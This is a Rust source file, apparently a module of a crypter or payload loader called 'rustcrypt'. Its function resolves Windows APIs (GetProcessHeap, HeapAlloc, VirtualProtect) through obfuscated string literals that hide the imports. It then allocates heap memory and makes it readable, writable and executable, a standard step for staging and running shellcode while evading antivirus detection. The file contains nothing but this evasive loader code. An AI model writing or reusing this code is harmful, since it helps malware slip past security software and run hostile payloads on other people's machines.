use crate::utils::{load_library, get_proc_address};

pub unsafe fn alloc_mem(size: usize) -> Result<*mut u8, String> {
    use rustcrypt_ct_macros::{obf_lit, obf_lit_bytes};
    use core::ffi::c_void;

    type GetProcessHeapFn = unsafe extern "system" fn() -> isize;
    type HeapAllocFn = unsafe extern "system" fn(h_heap: isize, dw_flags: u32, dw_bytes: usize) -> *mut c_void;
    type VirtualProtectFn = unsafe extern "system" fn(lp_address: *mut c_void, dw_size: usize, fl_new_protect: u32, lpfl_old_protect: *mut u32) -> i32;

    let kernel32 = load_library(obf_lit_bytes!(b"kernel32.dll\0").as_slice())?;
    let get_process_heap: GetProcessHeapFn = core::mem::transmute(get_proc_address(kernel32, obf_lit_bytes!(b"GetProcessHeap\0").as_slice())?);
    let heap_alloc: HeapAllocFn = core::mem::transmute(get_proc_address(kernel32, obf_lit_bytes!(b"HeapAlloc\0").as_slice())?);
    let virtual_protect: VirtualProtectFn = core::mem::transmute(get_proc_address(kernel32, obf_lit_bytes!(b"VirtualProtect\0").as_slice())?);

    let heap = get_process_heap();
    if heap == 0 {
        return Err(obf_lit!("GetProcessHeap failed").to_string());
    }
    let p = heap_alloc(heap, 0x00000008, size);
    if p.is_null() {
        return Err(obf_lit!("HeapAlloc failed").to_string());
    }
    let mut old_protect = 0u32;
    let ok = virtual_protect(p, size, 0x40, &mut old_protect); // PAGE_EXECUTE_READWRITE
    if ok == 0 {
        return Err(obf_lit!("VirtualProtect failed").to_string());
    }
    Ok(p as *mut u8)
}